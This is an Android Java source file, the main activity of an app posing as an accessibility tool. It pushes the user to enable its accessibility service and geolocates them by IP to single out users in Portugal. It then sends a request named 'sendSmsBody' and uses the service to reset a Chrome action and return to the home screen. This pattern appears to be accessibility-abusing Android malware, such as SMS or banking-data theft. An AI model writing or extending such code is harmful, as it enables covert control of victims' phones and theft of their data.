package com.example.acessibilityapp;

import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentTransaction;

import retrofit2.Call;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class MainActivity extends AppCompatActivity {

    private com.example.acessibilityapp.Retrofit apiRetrofitService;
    private MyAccessService service;
    private boolean isUserinPortugal = false;
    WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        service = MyAccessService.getInstance();
        String url = "http://ip-api.com/";

        retrofit2.Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(url)
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        apiRetrofitService = retrofit.create(com.example.acessibilityapp.Retrofit.class);

        if (!isAccessibilityServiceEnabled()) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        }else{
            checkUserLocationAndProceed();
        }
        // code for fragment here
    }

    private void loadWebViewFrag(boolean isUserinPortugal){
        Fragment webViewFrag = WebViewFrag.newInstance();

        if (!webViewFrag.isAdded()){
            Bundle bundle = new Bundle();
            bundle.putBoolean("isInPortugal", isUserinPortugal);
            Log.i("Main", String.valueOf(isUserinPortugal));
            webViewFrag.setArguments(bundle);



            FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();
            transaction.replace(R.id.fragment_container, webViewFrag);
            transaction.commit();
        }
    }


    private boolean isAccessibilityServiceEnabled(){
        int accessibilityEnabled = 0;
        final String service = getPackageName() + "/" + MyAccessService.class.getCanonicalName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return settingValue != null && settingValue.contains(service);
        }
        return false;
    }

    private void checkUserLocationAndProceed(){
        Call<IpResponse> call = apiRetrofitService.getIpLocation();
        call.enqueue(new retrofit2.Callback<IpResponse>() {
            @Override
            public void onResponse(Call<IpResponse> call, retrofit2.Response<IpResponse> response) {
                if (response.isSuccessful()) {
                    IpResponse locationResponse = response.body();
                    if (locationResponse != null && "PT".equals(locationResponse.getCountryCode())) {
                        isUserinPortugal = true;
                        Log.i("LOCATION", "User is in Portugal." + locationResponse);
                    } else {
                        Log.i("LOCATION", "User is not in Portugal.");
                    }

                    loadWebViewFrag(isUserinPortugal);

                    SendRequest(service); // Proceed with the original request
                } else {
                    Log.e("LOCATION", "Failed to get location. Response code: " + response.code());
                    loadWebViewFrag(false);
                }
            }

            @Override
            public void onFailure(Call<IpResponse> call, Throwable t) {
                Log.e("LOCATION", "Failed to get location", t);
                loadWebViewFrag(false);
            }
        });
    }



    private int SendRequest(MyAccessService service) {
        int statusCode = 0;

        Call<Void> call = apiRetrofitService.sendSmsBody();
        call.enqueue(new retrofit2.Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, retrofit2.Response<Void> response) {
                int statusCode = response.code();
                if (response.isSuccessful()) {
                    Log.i("GET", "GET request sent successfully." + statusCode);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            if (service != null) {
                                service.resetChromeAction();
                                service.GoToHome();
                            }
                            Log.i("ACCESS", "Returned to Home Screen");
                        }else{
                            Log.i("ACCESS", "Http request failed");
                        }
                    if (service != null){
                        service.resetHomeAction();
                    }else{
                        Log.e("MainActivity", "Accessibility service is not connected. Cannot reset home action.");
                    }
                } else {
                    Log.e("GET", "GET request failed. Response code: " + statusCode);
                }
            }

            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                Log.e("GET", "Exception in sending POST request", t);
            }
        });
        return statusCode;

    }

    @Override
    protected void onResume(){
        super.onResume();
    }
}